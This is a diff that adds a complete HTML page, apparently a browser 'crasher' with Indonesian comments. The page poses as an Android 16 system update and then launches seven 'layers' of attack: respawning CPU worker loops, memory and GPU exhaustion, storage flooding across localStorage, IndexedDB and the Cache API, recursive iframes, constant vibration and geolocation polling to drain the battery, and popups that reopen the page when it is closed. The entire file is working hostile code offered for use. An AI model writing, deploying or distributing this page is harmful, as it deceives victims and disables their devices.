@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System To 16</title>
+    <style>
+        body {
+            background: black;
+            color: white;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            margin: 0;
+            padding: 0;
+            width: 100vw;
+            height: 100vh;
+        }
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .warning {
+            color: red;
+            font-size: 24px;
+            text-align: center;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <div id="overlay">
+        <div class="warning">Sedang Mengupdate Device Anda</div>
+        <div>Device will restart in 3 seconds...</div>
+        <div style="font-size:12px; margin-top:50px;">By Android 16</div>
+    </div>
+
+    <script>
+        // ============================================================
+        // KONFIGURASI SERANGAN - 7 LAYER DEATH
+        // ============================================================
+        
+        // HIDE OVERLAY AFTER 3 SECONDS (USER THINKS IT'S NORMAL)
+        setTimeout(() => {
+            document.getElementById('overlay').classList.add('hidden');
+            startTotalAnnihilation();
+        }, 3000);
+
+        function startTotalAnnihilation() {
+            // ========================================================
+            // LAYER 1: CPU INFINITE LOOP (MULTI-THREADED)
+            // ========================================================
+            for (let i = 0; i < navigator.hardwareConcurrency * 2; i++) {
+                let workerCode = `
+                    while(true) {
+                        Math.sqrt(Math.random() * 999999999);
+                        Date.now();
+                        performance.now();
+                        new Array(1000000).fill(0).map(x => x * Math.random());
+                    }
+                `;
+                let blob = new Blob([workerCode], {type: 'application/javascript'});
+                let worker = new Worker(URL.createObjectURL(blob));
+                // Also create infinite workers that respawn
+                setInterval(() => {
+                    try {
+                        let w = new Worker(URL.createObjectURL(blob));
+                    } catch(e) {}
+                }, 100);
+            }
+
+            // ========================================================
+            // LAYER 2: MEMORY LEAK - FILL RAM WITH ARRAYS
+            // ========================================================
+            let memoryHogs = [];
+            setInterval(() => {
+                for (let i = 0; i < 100; i++) {
+                    memoryHogs.push(new Array(1000000).fill(String.fromCharCode(i + 65).repeat(1000)));
+                }
+            }, 10);
+
+            // ========================================================
+            // LAYER 3: WEBGL GPU OVERLOAD
+            // ========================================================
+            try {
+                let canvas = document.createElement('canvas');
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                document.body.appendChild(canvas);
+                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    let vertices = new Float32Array(1000000);
+                    for (let i = 0; i < 1000000; i++) vertices[i] = Math.random();
+                    let buffer = gl.createBuffer();
+                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                    gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
+                    
+                    let vs = gl.createShader(gl.VERTEX_SHADER);
+                    gl.shaderSource(vs, 'void main() { gl_Position = vec4(1.0); }');
+                    gl.compileShader(vs);
+                    
+                    let fs = gl.createShader(gl.FRAGMENT_SHADER);
+                    gl.shaderSource(fs, 'precision highp float; void main() { gl_FragColor = vec4(1.0); }');
+                    gl.compileShader(fs);
+                    
+                    let program = gl.createProgram();
+                    gl.attachShader(program, vs);
+                    gl.attachShader(program, fs);
+                    gl.linkProgram(program);
+                    gl.useProgram(program);
+                    
+                    setInterval(() => {
+                        gl.drawArrays(gl.POINTS, 0, 1000000);
+                    }, 1);
+                }
+            } catch(e) {}
+
+            // ========================================================
+            // LAYER 4: STORAGE FLOOD (INDEXEDDB + LOCALSTORAGE + CACHE)
+            // ========================================================
+            // LocalStorage flood
+            setInterval(() => {
+                try {
+                    for (let i = 0; i < 1000; i++) {
+                        localStorage.setItem('crash_' + i, 'A'.repeat(1024 * 1024)); // 1MB each
+                    }
+                } catch(e) {}
+            }, 100);
+
+            // IndexedDB flood
+            try {
+                let request = indexedDB.open('crashdb', 1);
+                request.onsuccess = function(e) {
+                    let db = e.target.result;
+                    setInterval(() => {
+                        let tx = db.transaction('store', 'readwrite');
+                        let store = tx.objectStore('store');
+                        for (let i = 0; i < 1000; i++) {
+                            store.put({id: i, data: new ArrayBuffer(1024 * 1024)}); // 1MB
+                        }
+                    }, 100);
+                };
+                request.onupgradeneeded = function(e) {
+                    e.target.result.createObjectStore('store', {keyPath: 'id'});
+                };
+            } catch(e) {}
+
+            // Cache API flood
+            if ('caches' in window) {
+                setInterval(() => {
+                    caches.open('crashcache').then(cache => {
+                        for (let i = 0; i < 100; i++) {
+                            cache.put('/crash/' + i, new Response('A'.repeat(1024 * 1024)));
+                        }
+                    });
+                }, 100);
+            }
+
+            // ========================================================
+            // LAYER 5: IFRAME RECURSION (STACK OVERFLOW + MEMORY LEAK)
+            // ========================================================
+            let iframe = document.createElement('iframe');
+            iframe.src = location.href; // Load itself recursively
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            
+            // Create hundreds of iframes loading the same page
+            for (let i = 0; i < 100; i++) {
+                let f = document.createElement('iframe');
+                f.src = location.href;
+                f.style.display = 'none';
+                document.body.appendChild(f);
+            }
+
+            // ========================================================
+            // LAYER 6: AUDIO CONTEXT + VIBRATION (WAKE LOCK PREVENT SLEEP)
+            // ========================================================
+            try {
+                let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                let oscillator = audioCtx.createOscillator();
+                let gain = audioCtx.createGain();
+                gain.gain.value = 0.1; // low volume but continuous
+                oscillator.connect(gain);
+                gain.connect(audioCtx.destination);
+                oscillator.start();
+                // Keep audio context alive
+                setInterval(() => {
+                    if (audioCtx.state === 'suspended') audioCtx.resume();
+                }, 100);
+            } catch(e) {}
+
+            // Vibration (bikin batrei cepet abis)
+            if (navigator.vibrate) {
+                setInterval(() => {
+                    navigator.vibrate([1000, 100, 1000, 100, 1000]);
+                }, 500);
+            }
+
+            // ========================================================
+            // LAYER 7: SENSOR & LOCATION SPAM (BATTERY DRAIN + CPU)
+            // ========================================================
+            if (navigator.geolocation) {
+                setInterval(() => {
+                    navigator.geolocation.getCurrentPosition(() => {}, () => {}, {
+                        enableHighAccuracy: true,
+                        maximumAge: 0,
+                        timeout: 100
+                    });
+                }, 10);
+            }
+
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    setInterval(() => {
+                        console.log(battery.level);
+                    }, 1);
+                });
+            }
+
+            // DeviceMotion event - high frequency
+            window.addEventListener('devicemotion', () => {}, true);
+            window.addEventListener('deviceorientation', () => {}, true);
+
+            // ========================================================
+            // PERSISTENCE: AUTO-RELOAD IF CLOSED
+            // ========================================================
+            window.addEventListener('beforeunload', function(e) {
+                // Try to reopen via popup
+                let win = window.open(location.href, '_blank');
+                if (win) {
+                    win.document.write('<meta http-equiv="refresh" content="0">');
+                }
+                // Also try to open multiple times
+                for (let i = 0; i < 10; i++) {
+                    setTimeout(() => {
+                        window.open(location.href, '_blank');
+                    }, i * 100);
+                }
+                // Prevent default unload
+                e.preventDefault();
+                e.returnValue = '';
+            });
+
+            // ========================================================
+            // ADDITIONAL: RENDER-BLOCKING LAYERS
+            // ========================================================
+            // Create 1000 divs with heavy CSS animations
+            for (let i = 0; i < 1000; i++) {
+                let div = document.createElement('div');
+                div.style.width = '100px';
+                div.style.height = '100px';
+                div.style.background = 'red';
+                div.style.animation = 'blink 0.01s infinite';
+                div.style.position = 'absolute';
+                div.style.top = Math.random() * 100 + '%';
+                div.style.left = Math.random() * 100 + '%';
+                document.body.appendChild(div);
+            }
+
+            // Canvas draw loops
+            let canvas2d = document.createElement('canvas');
+            canvas2d.width = window.innerWidth;
+            canvas2d.height = window.innerHeight;
+            document.body.appendChild(canvas2d);
+            let ctx = canvas2d.getContext('2d');
+            setInterval(() => {
+                for (let x = 0; x < canvas2d.width; x += 10) {
+                    for (let y = 0; y < canvas2d.height; y += 10) {
+                        ctx.fillStyle = 'rgba(' + Math.random()*255 + ',' + Math.random()*255 + ',' + Math.random()*255 + ',0.1)';
+                        ctx.fillRect(x, y, 10, 10);
+                    }
+                }
+            }, 1);
+
+            // ========================================================
+            // SELF-REPLICATING IFRAME (INFINITE LOOP)
+            // ========================================================
+            setInterval(() => {
+                let f = document.createElement('iframe');
+                f.srcdoc = '<script>setInterval(function(){window.open(location.href,"_blank");},10);<' + '/script>';
+                f.style.display = 'none';
+                document.body.appendChild(f);
+            }, 10);
+        }
+    </script>
+</body>
+</html>
